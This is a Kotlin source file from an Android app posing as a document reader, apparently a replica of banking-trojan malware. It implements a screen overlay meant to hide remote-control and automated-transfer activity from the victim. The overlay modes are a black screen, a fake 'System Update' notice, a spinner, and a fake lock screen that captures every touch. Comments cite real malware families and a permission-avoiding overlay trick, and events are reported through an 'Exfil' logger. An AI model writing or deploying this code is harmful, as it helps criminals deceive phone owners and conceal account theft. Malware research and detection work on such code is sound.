package com.docreader.lite.reader

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.view.Gravity
import android.view.View
import android.view.WindowManager

/**
 * Black screen overlay — mask RAT/VNC activity from victim.
 *
 * Family reference:
 *   - Crocodilus: full-screen black overlay during remote operations
 *   - ToxicPanda: black screen + "please wait" during ATS
 *   - Brokewell: screen dimming during hidden VNC sessions
 *   - Cerberus: lock screen overlay preventing user interaction
 *
 * Mechanism:
 *   Draws a full-screen, always-on-top, non-touchable black overlay.
 *   User sees a black screen and thinks device is off/locked.
 *   Meanwhile, hidden VNC or ATS operates behind the overlay.
 *
 * Variants:
 *   BLACK    — pure black (device appears off)
 *   UPDATE   — "System Update in Progress..." text (user waits patiently)
 *   LOADING  — fake loading spinner (buys time)
 *   LOCKED   — fake lock screen (prevents user from trying power button)
 *
 * Uses TYPE_ACCESSIBILITY_OVERLAY (2032) when available — no SYSTEM_ALERT_WINDOW needed.
 * Falls back to TYPE_APPLICATION_OVERLAY for pre-2025 targets.
 */
object ScreenDimmer {

    private var overlayView: View? = null
    private var windowManager: WindowManager? = null
    private var isShowing = false

    enum class ScreenMode {
        BLACK,     // Pure black — device appears off
        UPDATE,    // "System Update..." — user waits
        LOADING,   // Loading spinner — buys time
        LOCKED     // Fake lock — prevents interaction
    }

    fun show(context: Context, mode: ScreenMode = ScreenMode.BLACK) {
        if (isShowing) return

        windowManager = context.getSystemService(Context.WINDOW_SERVICE) as? WindowManager
            ?: return

        overlayView = createOverlayView(context, mode)

        val params = WindowManager.LayoutParams().apply {
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
            gravity = Gravity.CENTER

            // TYPE_ACCESSIBILITY_OVERLAY (2032) — Anatsa 2025+ pattern
            // Falls back to TYPE_APPLICATION_OVERLAY if not available
            type = if (Build.VERSION.SDK_INT >= 34) {
                2032 // TYPE_ACCESSIBILITY_OVERLAY — no SAW permission needed
            } else {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            }

            // Key flags:
            // FLAG_NOT_FOCUSABLE: overlay doesn't steal input focus
            // FLAG_NOT_TOUCH_MODAL: in BLACK mode, touches pass through to VNC
            // FLAG_LAYOUT_IN_SCREEN: covers status bar + nav bar
            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS

            // In LOCKED mode, capture touches to prevent user escape
            if (mode == ScreenMode.LOCKED) {
                flags = flags and WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv()
            }

            format = PixelFormat.OPAQUE
        }

        try {
            windowManager?.addView(overlayView, params)
            isShowing = true
            Exfil.event("black_screen_shown",
                "mode" to mode.name,
                "type" to if (Build.VERSION.SDK_INT >= 34) "a11y_2032" else "app_overlay"
            )
        } catch (e: Exception) {
            Exfil.event("black_screen_failed", "error" to (e.message ?: "unknown"))
        }
    }

    fun dismiss() {
        if (!isShowing) return
        try {
            windowManager?.removeView(overlayView)
        } catch (_: Exception) {}
        overlayView = null
        isShowing = false
        Exfil.event("black_screen_dismissed")
    }

    /**
     * Show black screen during ATS or VNC operation, auto-dismiss after duration.
     */
    fun showDuring(context: Context, mode: ScreenMode = ScreenMode.UPDATE, durationMs: Long = 60_000) {
        show(context, mode)
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            dismiss()
        }, durationMs)
    }

    fun isActive() = isShowing

    private fun createOverlayView(context: Context, mode: ScreenMode): View {
        return when (mode) {
            ScreenMode.BLACK -> {
                // Pure black view — device appears off
                View(context).apply {
                    setBackgroundColor(Color.BLACK)
                }
            }
            ScreenMode.UPDATE -> {
                // "System Update" view — user waits patiently
                android.widget.LinearLayout(context).apply {
                    orientation = android.widget.LinearLayout.VERTICAL
                    gravity = Gravity.CENTER
                    setBackgroundColor(Color.BLACK)

                    addView(android.widget.ProgressBar(context).apply {
                        isIndeterminate = true
                    })
                    addView(android.widget.TextView(context).apply {
                        text = "Installing System Update..."
                        setTextColor(Color.WHITE)
                        textSize = 18f
                        gravity = Gravity.CENTER
                        setPadding(0, 40, 0, 0)
                    })
                    addView(android.widget.TextView(context).apply {
                        text = "Do not turn off your device"
                        setTextColor(Color.GRAY)
                        textSize = 14f
                        gravity = Gravity.CENTER
                        setPadding(0, 16, 0, 0)
                    })
                }
            }
            ScreenMode.LOADING -> {
                // Loading spinner
                android.widget.FrameLayout(context).apply {
                    setBackgroundColor(Color.BLACK)
                    addView(android.widget.ProgressBar(context).apply {
                        isIndeterminate = true
                    }, android.widget.FrameLayout.LayoutParams(
                        android.widget.FrameLayout.LayoutParams.WRAP_CONTENT,
                        android.widget.FrameLayout.LayoutParams.WRAP_CONTENT,
                        Gravity.CENTER
                    ))
                }
            }
            ScreenMode.LOCKED -> {
                // Fake lock screen — captures all touches
                android.widget.LinearLayout(context).apply {
                    orientation = android.widget.LinearLayout.VERTICAL
                    gravity = Gravity.CENTER
                    setBackgroundColor(Color.BLACK)
                    // Intercept all touch events — user can't escape
                    setOnTouchListener { _, _ -> true }
                }
            }
        }
    }
}
